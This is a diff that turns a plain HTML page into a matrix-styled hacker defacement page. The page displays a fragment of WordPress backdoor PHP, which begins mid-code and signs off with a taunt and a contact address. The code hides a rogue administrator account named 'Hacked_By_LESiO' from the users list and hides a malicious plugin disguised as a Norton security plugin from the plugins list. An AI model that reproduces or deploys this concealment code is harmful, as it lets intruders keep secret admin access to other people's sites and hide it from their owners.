@@ -1,15 +1,86 @@
-<!DOCTYPE html>
-<html lang="en">
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+    .Screen {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        z-index: 5;
+        background-color: rgba(0, 0, 0, 0.15);
+        animation: ScreenEffect 0.05s ease infinite;
+        cursor: pointer;
+    }
+    
+    @keyframes ScreenEffect {
+        0% {
+            opacity: 0
+        }
+        50% {
+            opacity: 1
+        }
+        100% {
+            opacity: 0
+        }
+    }
+    
+    .Pulse {
+        animation: Pulse 1.5s ease infinite;
+    }
+    
+    @keyframes Pulse {
+        0% {
+            opacity: 0
+        }
+        50% {
+            opacity: 1
+        }
+        100% {
+            opacity: 0
+        }
+    }
+    
+    .DivClass {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        background: #0F140F;
+        padding: 5% 5% 5% 5%;
+    }
+    
+    .MatrixTextEffect {
+        color: rgba(125, 225, 125, 0.75);
+        font-family: 'VT323', monospace;
+        font-size: 25px;
+        text-shadow: 0 0 5px rgba(125, 225, 125, 0.5), 0 0 15px rgba(125, 250, 125, 1);
+    }
+    
+    body {
+        background: #0F0F0F;
+    }
+</style>
+<div class="Screen"></div>
+<div class="DivClass">
+    <span class="MatrixTextEffect">set_role('administrator');
+            }
+        }
+    }
+    
+    // Hide the administrator account from the users list.
+    
+    add_action('pre_user_query','Ghost_Backdoor');
+    
+    function Ghost_Backdoor($user_search) {
+        global $current_user;
+        $username = $current_user->user_login;
+    
+        if ($username == '<span class="Pulse">Reel_</span>') { } else { global $wpdb; $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != '<span class="Pulse">Hacked_By_LESiO</span>'",$user_search->query_where);
+    } } // Hide the plugin from the plugins list. add_action('pre_current_active_plugins', 'Ghost_Plugin'); function Ghost_Plugin() { global $wp_list_table; $hidearr = array('norton-security-wordpress/norton-security-wordpress.php'); $myplugins = $wp_list_table->items;
+    foreach ($myplugins as $key => $val) { if (in_array($key,$hidearr)) { unset($wp_list_table->items[$key]); } } } // The creator of this code is also a web developer. Maybe he can do something for your ugly website. // Contact me at <span class="Pulse">doos4230@gmail.com</span>    ?>
+    </span>
+</div>
 
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Matrix</title>
-</head>
-
-<body>
-    <h2>Hell gg no!</h2>
-</body>
-
-</html>
+<span class="Pulse"></span>
